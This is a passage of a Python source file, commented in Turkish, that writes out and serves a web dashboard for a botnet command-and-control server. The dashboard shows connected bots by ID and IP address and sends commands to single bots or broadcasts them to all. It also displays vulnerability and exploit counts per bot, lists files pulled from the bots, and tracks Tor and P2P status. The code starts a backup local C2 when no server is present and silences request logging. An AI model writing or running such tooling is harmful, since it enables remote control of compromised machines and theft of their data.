                                <div class="terminal-text" style="max-height:300px; overflow:auto;">
                                    <h6 class="mb-2">Bots with Vulnerabilities</h6>
                                    <div id="vuln-bots-list"></div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="col-md-4">
                <div class="card">
                    <div class="card-header">
                        <i class="fas fa-download me-2"></i>Recent Downloads
                    </div>
                    <div class="card-body">
                        <div id="downloads-container" class="terminal-text" style="max-height:430px; overflow:auto;"></div>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Real-time Terminal -->
        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="fas fa-terminal me-2"></i>Real-time Terminal
                        <button class="btn btn-custom btn-sm float-end" onclick="clearTerminal()">
                            <i class="fas fa-trash me-1"></i>Clear
                        </button>
                    </div>
                    <div class="card-body">
                        <div id="terminal-output" class="terminal-text" style="height: 400px; overflow-y: auto; margin-bottom: 15px;">
                            <div class="terminal-line system">🟢 Terminal ready - Type 'help' for commands</div>
                        </div>
                        <div class="input-group">
                            <span class="input-group-text terminal-prompt">$</span>
                            <input type="text" class="form-control command-input" id="terminal-input" placeholder="Enter command... (try 'list' or 'help')" autocomplete="off">
                            <button class="btn btn-custom" onclick="sendTerminalCommand()">
                                <i class="fas fa-paper-plane"></i>
                            </button>
                        </div>
                        <div class="mt-2">
                            <small class="text-muted">
                                💡 Quick commands: <code>list</code> (show bots), <code>help</code> (commands), <code>status</code> (system info)
                            </small>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Status Bar -->
        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-body text-center">
                        <div class="terminal-text">
                            <span id="status-text">🟢 System Online | 📡 Monitoring Active | 🔒 Security Enabled</span>
                            <span id="loading-indicator" style="display:none;" class="loading ms-2"></span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <script>
        // WebSocket bağlantısı
        const socket = io();
        
        // Terminal için
        let commandHistory = [];
        let historyIndex = -1;
        
        // Socket event listeners
        socket.on('connect', function() {
            console.log('WebSocket connected');
        });
        
        socket.on('terminal_output', function(data) {
            addTerminalOutput(data.type, data.message, data.timestamp);
        });
        
        socket.on('terminal_clear', function() {
            document.getElementById('terminal-output').innerHTML = '';
        });
        
        // Terminal fonksiyonları
        function addTerminalOutput(type, message, timestamp) {
            const output = document.getElementById('terminal-output');
            const line = document.createElement('div');
            line.className = `terminal-line ${type}`;
            
            const time = new Date(timestamp * 1000).toLocaleTimeString();
            line.textContent = `[${time}] ${message}`;
            
            output.appendChild(line);
            output.scrollTop = output.scrollHeight;
        }
        
        function sendTerminalCommand() {
            const input = document.getElementById('terminal-input');
            const command = input.value.trim();
            
            if (!command) return;
            
            // Komut geçmişine ekle
            commandHistory.unshift(command);
            if (commandHistory.length > 50) commandHistory.pop();
            historyIndex = -1;
            
            // Terminal'e komutu göster
            addTerminalOutput('system', `$ ${command}`, Date.now() / 1000);
            
            // Komut parsing
            let bot_id = '';
            let actual_command = command;
            
            // Bot ID'si var mı kontrol et (format: bot_id command)
            const parts = command.split(' ');
            if (parts.length >= 2 && !['list', 'bots', 'ls', 'help', '?', 'clear', 'cls', 'status'].includes(parts[0].toLowerCase())) {
                bot_id = parts[0];
                actual_command = parts.slice(1).join(' ');
            }
            
            // WebSocket ile gönder
            socket.emit('terminal_command', {
                command: actual_command,
                bot_id: bot_id
            });
            
            input.value = '';
        }
        
        function clearTerminal() {
            document.getElementById('terminal-output').innerHTML = '';
            addTerminalOutput('system', '🟢 Terminal cleared', Date.now() / 1000);
        }
        
        // Enter tuşu ile komut gönder
        document.getElementById('terminal-input').addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                sendTerminalCommand();
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (historyIndex < commandHistory.length - 1) {
                    historyIndex++;
                    this.value = commandHistory[historyIndex] || '';
                }
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (historyIndex > 0) {
                    historyIndex--;
                    this.value = commandHistory[historyIndex] || '';
                } else if (historyIndex === 0) {
                    historyIndex = -1;
                    this.value = '';
                }
            }
        });
        
        // Auto-refresh data every 5 seconds
        setInterval(refreshData, 5000);
        
        function refreshData() {
            const loadingIndicator = document.getElementById('loading-indicator');
            const statusText = document.getElementById('status-text');
            
            loadingIndicator.style.display = 'inline-block';
            statusText.textContent = '🔄 Updating data...';
            
            fetch('/api/bots')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('active-bots').textContent = data.active;
                    updateBotsList(data.bots);
                })
                .catch(error => {
                    console.error('Error fetching bots:', error);
                });
                
            fetch('/api/alerts')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('security-alerts').textContent = data.total_alerts;
                    updateAlerts(data.alerts);
                })
                .catch(error => {
                    console.error('Error fetching alerts:', error);
                });
                
            fetch('/api/p2p')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('p2p-networks').textContent = data.active_p2p;
                })
                .catch(error => {
                    console.error('Error fetching P2P:', error);
                })
            
            // Vuln summary
            fetch('/api/vulns')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('vuln-total').textContent = data.total_vulnerabilities;
                    document.getElementById('vuln-bots').textContent = data.total_bots_scanned;
                    // High/Critical toplamını hesapla
                    let high = 0;
                    for (const [platform, stats] of Object.entries(data.platforms || {})) {
                        high += (stats.high_severity || 0);
                    }
                    document.getElementById('vuln-high').textContent = high;
                    updateVulnPlatforms(data.platforms || {});
                    updateVulnBotsList(data.per_bot_counts || {});
                })
                .catch(error => console.error('Error fetching vulns:', error));

            // Downloads
            fetch('/api/downloads')
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        updateDownloads(data.downloads);
                    }
                })
                .catch(error => console.error('Error fetching downloads:', error))
                .finally(() => {
                    loadingIndicator.style.display = 'none';
                    statusText.textContent = '🟢 System Online | 📡 Monitoring Active | 🔒 Security Enabled';
                });
        }
        
        function sendSingleCommand() {
            const botId = document.getElementById('bot-select').value;
            const command = document.getElementById('single-command').value;
            
            if (!botId || !command) {
                alert('Please select a bot and enter a command');
                return;
            }
            
            const statusText = document.getElementById('status-text');
            statusText.textContent = '📤 Sending command...';
            
            fetch('/api/command', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    bot_id: botId,
                    command: command
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    statusText.textContent = '✅ Command sent successfully!';
                    document.getElementById('single-command').value = '';
                    setTimeout(() => {
                        statusText.textContent = '🟢 System Online | 📡 Monitoring Active | 🔒 Security Enabled';
                    }, 3000);
                } else {
                    statusText.textContent = '❌ Error: ' + data.error;
                }
            })
            .catch(error => {
                statusText.textContent = '❌ Network error';
                console.error('Error:', error);
            });
        }
        
        function sendBroadcastCommand() {
            const command = document.getElementById('broadcast-command').value;
            
            if (!command) {
                alert('Please enter a command');
                return;
            }
            
            const statusText = document.getElementById('status-text');
            statusText.textContent = '📡 Broadcasting command...';
            
            fetch('/api/broadcast', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    command: command
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    statusText.textContent = '✅ Broadcast command sent successfully!';
                    document.getElementById('broadcast-command').value = '';
                    setTimeout(() => {
                        statusText.textContent = '🟢 System Online | 📡 Monitoring Active | 🔒 Security Enabled';
                    }, 3000);
                } else {
                    statusText.textContent = '❌ Error: ' + data.error;
                }
            })
            .catch(error => {
                statusText.textContent = '❌ Network error';
                console.error('Error:', error);
            });
        }
        
        function updateBotsList(bots) {
            const container = document.getElementById('bots-container');
            const items = Object.entries(bots || {});
            if (!items.length) {
                container.innerHTML = '<div class="col-12 text-center text-muted">No bots connected</div>';
                return;
            }
            let html = '';
            for (const [botId, bot] of items) {
                html += `
                <div class="col-md-6 mb-3">
                    <div class="card bot-card">
                        <div class="card-body">
                            <h6 class="card-title">${botId}</h6>
                            <p class="card-text">
                                <small class="text-muted">
                                    <i class="fas fa-map-marker-alt me-1"></i>${bot.ip || ''}<br>
                                    <i class="fas fa-clock me-1"></i>${new Date((bot.last_seen||0)*1000).toLocaleString()}<br>
                                </small>
                            </p>
                            <div class="d-flex gap-2">
                                <button class="btn btn-custom btn-sm" onclick="quickCmd('${botId}','ai_p2p_status')"><i class="fas fa-brain me-1"></i>AI-P2P</button>
                                <button class="btn btn-custom btn-sm" onclick="quickCmd('${botId}','vuln status')"><i class="fas fa-bug me-1"></i>Vulns</button>
                                <button class="btn btn-custom btn-sm" onclick="quickCmd('${botId}','network_map status')"><i class="fas fa-project-diagram me-1"></i>Map</button>
                            </div>
                        </div>
                    </div>
                </div>`;
            }
            container.innerHTML = html;
        }
        
        function updateAlerts(alerts) {
            const container = document.getElementById('alerts-container');
            const items = Object.entries(alerts || {});
            if (!items.length) {
                container.innerHTML = '<div class="text-center text-muted">No alerts</div>';
                return;
            }
            let html = '';
            for (const [botId, alert] of items) {
                const ts = new Date((alert.timestamp||0)*1000).toLocaleString();
                html += `
                <div class="alert">
                    <strong>${botId}</strong><br>
                    <small>${alert.message||''}</small><br>
                    <small class="text-muted">${ts}</small>
                </div>`;
            }
            container.innerHTML = html;
        }

        function updateVulnPlatforms(platforms) {
            const container = document.getElementById('vuln-platforms');
            const entries = Object.entries(platforms || {});
            if (!entries.length) { container.innerHTML = '<div class="text-muted">No data</div>'; return; }
            let html = '<ul class="mb-0">';
            for (const [name, stats] of entries) {
                html += `<li><strong>${name}</strong>: ${stats.total||0} total, <span class="sev-high sev-badge">${stats.high_severity||0} high</span>, ⚔️ ${stats.exploits_available||0} exploits</li>`;
            }
            html += '</ul>';
            container.innerHTML = html;
        }

        function updateVulnBotsList(perBot) {
            const container = document.getElementById('vuln-bots-list');
            const entries = Object.entries(perBot || {}).sort((a,b)=>b[1]-a[1]);
            if (!entries.length) { container.innerHTML = '<div class="text-muted">No data</div>'; return; }
            let html = '<ul class="mb-0">';
            for (const [botId, count] of entries) {
                html += `<li>${botId}: <strong>${count}</strong></li>`;
            }
            html += '</ul>';
            container.innerHTML = html;
        }

        function updateDownloads(downloads) {
            const container = document.getElementById('downloads-container');
            if (!downloads || !downloads.length) { container.innerHTML = '<div class="text-muted">No downloads</div>'; return; }
            let html = '';
            for (const d of downloads) {
                const ts = new Date((d.timestamp||0)*1000).toLocaleString();
                const ok = d.hash_verified ? '✅' : '⚠️';
                html += `<div class="mb-2">
                    <div><strong>${d.bot_id||''}</strong> · ${d.saved_path||''}</div>
                    <div><small>${ts} · ${d.file_size||0} bytes · ${ok}</small></div>
                </div>`;
            }
            container.innerHTML = html;
        }

        function quickCmd(botId, command) {
            fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ bot_id: botId, command: command })
            });
        }
        
        // Update uptime
        function updateUptime() {
            fetch('/api/server')
                .then(response => response.json())
                .then(data => {
                    const uptime = data.server_info.uptime_seconds;
                    const hours = Math.floor(uptime / 3600);
                    const minutes = Math.floor((uptime % 3600) / 60);
                    const seconds = uptime % 60;
                    document.getElementById('uptime').textContent = 
                        `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                })
                .catch(error => {
                    console.error('Error updating uptime:', error);
                });
        }
        
        setInterval(updateUptime, 1000);
        updateUptime();
        
        // Initial data load
        refreshData();
    </script>
</body>
</html>'''

# Template dosyasını oluştur
with open('templates/dashboard.html', 'w', encoding='utf-8') as f:
    f.write(dashboard_html)

def update_data_from_server(server_instance):
    """Server.py'den veri güncelleme fonksiyonu"""
    global bots_data, p2p_status, wireshark_alerts, server_info, bot_vulnerabilities, platform_stats
    
    if hasattr(server_instance, 'bots'):
        bots_data = server_instance.bots.copy()
        server_info['active_bots'] = len(bots_data)
    
    if hasattr(server_instance, 'p2p_status'):
        p2p_status.update(server_instance.p2p_status)
    
    if hasattr(server_instance, 'wireshark_alerts'):
        wireshark_alerts.update(server_instance.wireshark_alerts)
    
    # Network maps verilerini güncelle
    if hasattr(server_instance, 'network_maps'):
        server_info['network_maps'] = server_instance.network_maps.copy()
        server_info['network_maps_enabled'] = server_instance.network_maps_enabled

    # Vulnerability verilerini güncelle
    if hasattr(server_instance, 'bot_vulnerabilities'):
        bot_vulnerabilities = server_instance.bot_vulnerabilities.copy()
    if hasattr(server_instance, 'platform_stats'):
        platform_stats = server_instance.platform_stats.copy()

    # Tor durumu
    if hasattr(server_instance, 'tor_enabled'):
        server_info['tor_enabled'] = server_instance.tor_enabled

def start_web_dashboard(server_instance_ref=None, host='0.0.0.0', port=5500):
    """Web dashboard'u başlat"""
    global server_instance
    server_instance = server_instance_ref
    
    print(f"\033[94m[*] Web Dashboard başlatılıyor: http://{host}:{port}\033[0m")
    
    if server_instance:
        # Server verilerini periyodik olarak güncelle
        def update_loop():
            while True:
                try:
                    update_data_from_server(server_instance)
                    time.sleep(2)  # Her 2 saniyede bir güncelle
                except Exception as e:
                    print(f"\033[91m[!] Web dashboard update error: {e}\033[0m")
        
        update_thread = threading.Thread(target=update_loop, daemon=True)
        update_thread.start()
    else:
        # Server yoksa, local backup C2'yi başlat
        global local_c2
        local_c2 = LocalC2(host='0.0.0.0', port=8080)
        local_c2.start()
    
    # Flask server'ı başlat (log'ları sustur)
    try:
        # Uygulama ve framework loglarını kıs
        app.logger.disabled = True
        for name in ['werkzeug', 'engineio', 'socketio']:
            lg = logging.getLogger(name)
            lg.setLevel(logging.ERROR)
            lg.propagate = False
        logging.getLogger('werkzeug').disabled = True

        # HTTP request loglarını tamamen kapat
        try:
            from werkzeug.serving import WSGIRequestHandler
            WSGIRequestHandler.log_request = lambda *args, **kwargs: None
        except Exception:
            pass

        socketio.run(app, host=host, port=port, debug=False, allow_unsafe_werkzeug=True, log_output=False)
    except Exception as e:
        print(f"\033[91m[!] Web dashboard error: {e}\033[0m")

if __name__ == '__main__':
    # Test launcher
    def test_launcher():
        start_web_dashboard(server_instance_ref=None, host='0.0.0.0', port=5500)
    
    test_launcher()